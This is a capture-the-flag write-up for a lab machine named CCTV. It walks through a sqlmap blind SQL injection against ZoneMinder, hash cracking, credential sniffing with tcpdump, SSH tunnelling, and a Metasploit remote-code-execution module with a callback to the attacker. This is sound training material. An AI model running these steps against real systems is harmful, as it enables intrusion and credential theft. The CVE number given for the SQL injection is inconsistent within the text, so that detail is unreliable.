+++
date = '2026-07-20T17:58:50+02:00'
draft = false
title = 'CCTV Writeup EN'
+++
**Name**: **`joy.scd01`**

**Date**: **`11/03/2026`**

![CCTV.png](/images/imgs_cctv/CCTV.png)

---
# Introduction

**_CCTV_** is an **Easy-level Linux** that starts with standard web enumeration, leading to a **ZoneMinder** login page. By investigating known vulnerabilities, the initial access is obtained via a **Boolean-Based Blind SQL Injection** using **sqlmap** to dump user credentials. Once on the machine, lateral movement is achieved by abusing **tcpdump** capabilities to sniff credentials in transit across an internal bridge interface. Finally, a local port forwarding reveals a **MonitorEye** instance, which is trivially exploited via **Metasploit** to achieve root access.

---
# Techniques Used

- **Web Enumeration & Directory Fuzzing**

- **Boolean-based Blind SQL injection (CVE-2024-5148)**

- **Password Cracking**

- **Network Sniffing via tcpdump Capabilities**

- **SSH Local Port Forwarding**

- **MonitorEye Exploitation (CVE-2025-60787)**

# Enumeration

## nmap

Initial scan on all ports:

```bash
nmap -p- cctv.htb
```

```text
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV cctv.htb
```

```text
PORT   STATE SERVICE    REASON
22/tcp open  tcpwrapped syn-ack ttl 63
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  tcpwrapped syn-ack ttl 63
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS
```

**Open ports**:

- **22**/tcp - SSH

- **80**/tcp - HTTP (Apache/2.4.58)

I added **`cctv.htb`** to my **`/etc/hosts`** file.

## Web Enumeration

Browsing to port **80** I landed on a **SecureVision** instance. Clicking on **`Staff Login`** lead to a **`ZoneMinder`** login page.

![web.png](/images/imgs_cctv/web.png) 

---
# Initial Access | ZoneMinder SQLi

I searched online for **ZoneMinder CVEs** and read a few articles discussing a known **Boolean-based Blind SQL injection**: **CVE-2024-5148**

- **https://www.sentinelone.com/vulnerability-database/cve-2024-51482/**

I searched for a **PoC** to understand how the vulnerability was triggered and found the exact request **URL** format needed.

So, I've proxyied the traffic through **Burp Suite**,I intercepted a login request, saved it to a file named **`req.txt`**.

```text
GET /zm/index.php?view=request&request=event&action=removetag&tid=1 HTTP/1.1
Host: cctv.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: zmSkin=classic; zmCSS=base; ZMSESSID=rp4v447p90v8134m8lgs0m8v3o
Connection: keep-alive
```

Then I fired up **sqlmap** to automate the exploitation.

I quickly identified that the parameter "**`tid`**" was vulnerable to a **Boolean-Based Blind SQLi**.

**Note**: _Since **Blind SQL injections** can still be quite time-consuming, I didn't want to blindly dump the entire database. I did a quick **Google** search to find the default database name for **ZoneMinder**, which usually defaults to **zm**. And the credentials table: **`Users`**._

I ran the final **sqlmap** command to dump the User and Password columns:

```bash
sqlmap -r req.txt -p "tid" -D zm -T Users -C User,Password --batch --technique=B
```

![database_dump.png](/images/imgs_cctv/database_dump.png)

The tool successfully extracted some hashes. The most interesting was the one for the user **mark**. I saved it into **`mark.txt`** and cracked it using **john**:

```bash
john mark.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![hash_crack.png](/images/imgs_cctv/hash_crack.png)

With the cleartext password, I logged in via **SSH** and gained initial access to the machine.

```bash
ssh mark@cctv.htb
```

![initial_access_1.png](/images/imgs_cctv/initial_access_1.png)
![initial_access_2.png](/images/imgs_cctv/initial_access_2.png)

---
# Lateral Movement | Network Sniffing

The first thing I did as **mark** was check sudo privileges using **`sudo -l`**, but it didn't lead anywhere. So, I transferred and executed **`linpeas.sh`** to automate the local enumeration.

![linpeas_cap.png](/images/imgs_cctv/linpeas_cap.png)

Reviewing the **LinPEAS** output, I noticed something very interesting: the **tcpdump** binary had active capabilities set on it.

**Note**: _Having cap_net_raw capability on **tcpdump** means that a low-privileged user can capture packets on network interfaces exactly like the **root** user would._

I ran **`ip a`** to list the network interfaces and spotted a bridge interface named **`br-1b6b4b93c636`**. Since there was likely some internal traffic flowing through it, I fired up **tcpdump** to sniff the packets:

```bash
tcpdump -i br-1b6b4b93c636 -nn -A
```

Watching the cleartext traffic flow by, I captured valid credentials for another user: **sa_mark**.

![sniffed_creds.png](/images/imgs_cctv/sniffed_creds.png)

I simply switched to this new user and grabbed the **user flag**.

```bash
ssh sa_mark@cctv.htb
cat user.txt
```

![latera_mov_userf.png](/images/imgs_cctv/latera_mov_userf.png)

---
# Privilege Escalation | MonitorEye Exploitation (CVE-2025-60787)

While enumerating **sa_mark**'s home directory, I downloaded and read a **PDF** file that explicitly hinted at **password reuse**.

![pdf_hint.png](/images/imgs_cctv/pdf_hint.png)

Next, I checked the internal services:

```bash
ss -tuln
```

![8765.png](/images/imgs_cctv/8765.png)

Filtering out the standard known ports (like **53**, **22**, **80**, and **MySQL**'s **3306**), several local ports with unknown uses remained listening (such as **8888**, **9081**, **8554**, **7999**, **1935**, and **8765**).

Doing a quick **Google** search for these ports revealed that **8765** is the default port used by **MonitorEye**. Putting two and two together with the machine's name (**CCTV**), I immediately knew which one was my real target.

To interact with it comfortably from my browser, I set up an **SSH** tunnel:

```bash
ssh -L 8765:127.0.0.1:8765 sa_mark@cctv.htb
```

Browsing to **http://127.0.0.1:8765**, I discovered an instance of **MonitorEye**.

I was able to log in using **sa_mark**'s credentials and, after noticing the exact version (**4.7.1**), I immediately searched for known vulnerabilities.

Found an existing module in **Metasploit** for **CVE-2025-60787**. 

**Note**: _**CVE-2025-60787** is a critical **Authenticated Remote Code Execution** (**RCE**) vulnerability affecting **MonitorEye** up to version **4.7.1**. Since the exploit requires valid credentials to interact with the vulnerable endpoint, the password reuse discovery was the missing piece of the puzzle. Once authenticated, the flaw allows an attacker to inject and execute arbitrary system commands, effectively escalating privileges._

I started **msfconsole**, selected the exploit, and configured the required options.

```bash
msfconsole
search monitoreye
use exploit/path/to/monitoreye_module
set RHOSTS 127.0.0.1
set RPORT 8765
set LHOST tun0
run
```

![msf_module.png](/images/imgs_cctv/msf_module.png)

Thanks to the previous password reuse hint, I got **root**, and grabbed the final flag.

---
# Final Thoughts

**_CCTV_** is a solid and well-balanced **Easy** box. The initial foothold is a great reminder of why checking the official documentation is often your best weapon: looking up the default database and table schemas saves you from watching **sqlmap** struggle for hours on a **Blind SQLi**.

**Sources**:

- **CVE-2024-51482 Explanation** | **https://www.sentinelone.com/vulnerability-database/cve-2024-51482/**
- **ZoneMinder Official Documentation** | **https://zoneminder.readthedocs.io/en/latest/**
- **MonitorEye CVE-2025-60787** | **https://www.sentinelone.com/vulnerability-database/cve-2025-60787/**